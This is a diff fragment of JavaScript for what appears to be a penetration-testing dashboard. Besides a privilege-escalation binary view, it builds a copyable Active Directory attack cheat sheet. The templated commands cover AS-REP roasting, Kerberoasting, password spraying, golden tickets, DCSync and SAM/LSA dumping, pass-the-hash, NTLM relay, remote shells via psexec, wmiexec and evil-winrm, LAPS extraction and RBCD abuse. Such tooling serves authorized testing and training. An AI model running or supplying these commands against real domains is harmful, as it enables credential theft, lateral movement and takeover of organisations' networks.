+            <button onclick="event.stopPropagation();navigator.clipboard.writeText('${escapeAttr(cmd)}')" class="text-slate-400 hover:text-white text-[10px] shrink-0 px-1"><i class="fa-solid fa-copy"></i></button></div></div>`
+        ).join('');
+        return `<div class="border border-white/5 rounded-lg p-3 bg-slate-800/30">
+            <div class="flex items-center gap-2 mb-2">
+                <span class="text-sm font-bold text-white font-mono">${escapeHtml(b.bin)}</span>
+            </div>
+            <div class="flex flex-wrap gap-1 mb-2">${fnBadges}</div>
+            <div class="space-y-1">${cmds}</div>
+        </div>`;
+    }).join('') || '<div class="text-slate-500 text-xs py-4 text-center col-span-full">No binaries found</div>';
+}
+
+function filterPrivEsc() { renderPrivEsc(); }
+function filterPrivEscFn(fn) {
+    privescFnFilter = fn;
+    document.querySelectorAll('.privesc-fn-btn').forEach(b => {
+        b.className = b.dataset.fn === fn ? 'privesc-fn-btn px-2 py-1 rounded text-[11px] bg-violet-600 text-white' : 'privesc-fn-btn px-2 py-1 rounded text-[11px] bg-slate-800 text-slate-300 border border-white/5';
+    });
+    renderPrivEsc();
+}
+
+// ========== AD ENUMERATION ==========
+const AD_SECTIONS = [
+    {name:'Initial Enumeration', cmds:[
+        {cmd:'crackmapexec smb {dc} --shares', desc:'Enumerate SMB shares'},
+        {cmd:'crackmapexec smb {dc} --users', desc:'Enumerate domain users'},
+        {cmd:'crackmapexec smb {dc} --groups', desc:'Enumerate domain groups'},
+        {cmd:'enum4linux -a {dc}', desc:'Full enum4linux scan'},
+        {cmd:'ldapsearch -x -H ldap://{dc} -b "DC={domain_parts}" "(objectClass=user)"', desc:'LDAP user enumeration'},
+        {cmd:'nmap -p 88,135,139,389,445,636,3268 {dc}', desc:'Scan AD-related ports'},
+        {cmd:'rpcclient -U "" -N {dc}', desc:'Null session RPC'},
+        {cmd:'smbclient -L //{dc} -N', desc:'List SMB shares (null session)'},
+    ]},
+    {name:'Kerberos Attacks', cmds:[
+        {cmd:'impacket-GetNPUsers {domain}/ -usersfile users.txt -no-pass -dc-ip {dc}', desc:'AS-REP Roasting'},
+        {cmd:'impacket-GetUserSPNs {domain}/{user}:{pass} -dc-ip {dc} -request', desc:'Kerberoasting'},
+        {cmd:'kerbrute userenum --dc {dc} -d {domain} users.txt', desc:'Username enumeration via Kerberos'},
+        {cmd:'kerbrute passwordspray --dc {dc} -d {domain} users.txt {pass}', desc:'Password spraying'},
+        {cmd:'impacket-ticketer -nthash HASH -domain-sid S-1-5-... -domain {domain} Administrator', desc:'Golden ticket'},
+    ]},
+    {name:'Credential Attacks', cmds:[
+        {cmd:'impacket-secretsdump {domain}/{user}:{pass}@{dc}', desc:'DCSync / dump secrets'},
+        {cmd:'crackmapexec smb {dc} -u {user} -p {pass} --sam', desc:'Dump SAM database'},
+        {cmd:'crackmapexec smb {dc} -u {user} -p {pass} --lsa', desc:'Dump LSA secrets'},
+        {cmd:'crackmapexec smb {dc} -u {user} -H NTHASH --pass-the-hash', desc:'Pass the hash'},
+        {cmd:'impacket-ntlmrelayx -tf targets.txt -smb2support', desc:'NTLM relay attack'},
+    ]},
+    {name:'Lateral Movement', cmds:[
+        {cmd:'impacket-psexec {domain}/{user}:{pass}@{dc}', desc:'PSExec remote shell'},
+        {cmd:'impacket-wmiexec {domain}/{user}:{pass}@{dc}', desc:'WMI remote execution'},
+        {cmd:'impacket-smbexec {domain}/{user}:{pass}@{dc}', desc:'SMB exec remote shell'},
+        {cmd:'evil-winrm -i {dc} -u {user} -p {pass}', desc:'WinRM shell'},
+        {cmd:'crackmapexec smb {dc} -u {user} -p {pass} -x "whoami"', desc:'Remote command execution'},
+    ]},
+    {name:'Privilege Escalation', cmds:[
+        {cmd:'bloodhound-python -u {user} -p {pass} -d {domain} -dc {dc} -c All', desc:'BloodHound collection'},
+        {cmd:'impacket-findDelegation {domain}/{user}:{pass} -dc-ip {dc}', desc:'Find delegation rights'},
+        {cmd:'crackmapexec ldap {dc} -u {user} -p {pass} -M laps', desc:'LAPS password extraction'},
+        {cmd:'impacket-rbcd -delegate-to TARGET$ -action write {domain}/{user}:{pass}', desc:'RBCD attack'},
+    ]},
+];
+
+function renderADCommands() {
+    const domain = document.getElementById('ad-domain')?.value || 'DOMAIN';
+    const user = document.getElementById('ad-user')?.value || 'user';
+    const pass = document.getElementById('ad-pass')?.value || 'password';
+    const dc = document.getElementById('ad-dc')?.value || '10.10.10.10';
+    const domainParts = domain.split('.').map(p => 'DC=' + p).join(',');
+
+    document.getElementById('adenum-list').innerHTML = AD_SECTIONS.map(section => {
+        const cmds = section.cmds.map(c => {
+            const resolved = c.cmd.replace(/\{domain\}/g, domain).replace(/\{user\}/g, user).replace(/\{pass\}/g, pass).replace(/\{dc\}/g, dc).replace(/\{domain_parts\}/g, domainParts);
+            return `<div class="payload-row flex items-center gap-2 px-2 py-1.5 rounded text-xs">
+                <code class="text-violet-300 font-mono flex-1 truncate">${escapeHtml(resolved)}</code>
+                <span class="text-slate-500 text-[10px] shrink-0 truncate max-w-[180px]">${escapeHtml(c.desc)}</span>
+                <button onclick="navigator.clipboard.writeText(this.closest('.payload-row').querySelector('code').textContent)" class="copy-btn text-slate-400 hover:text-white text-[10px] shrink-0"><i class="fa-solid fa-copy"></i></button>
+            </div>`;
+        }).join('');
+        return `<div class="border border-white/5 rounded-lg overflow-hidden">
+            <button onclick="toggleAccordion(this)" class="w-full flex items-center justify-between px-4 py-2.5 bg-slate-800/50 hover:bg-slate-800 text-left transition-colors">
+                <span class="text-xs font-medium text-white">${escapeHtml(section.name)}</span>
+                <i class="fa-solid fa-chevron-down text-[10px] text-slate-500 transition-transform"></i>
+            </button>
+            <div class="accordion-content open"><div class="p-2 space-y-0.5">${cmds}</div></div>
+        </div>`;
+    }).join('');
+}
 </script>
 {% endblock %}
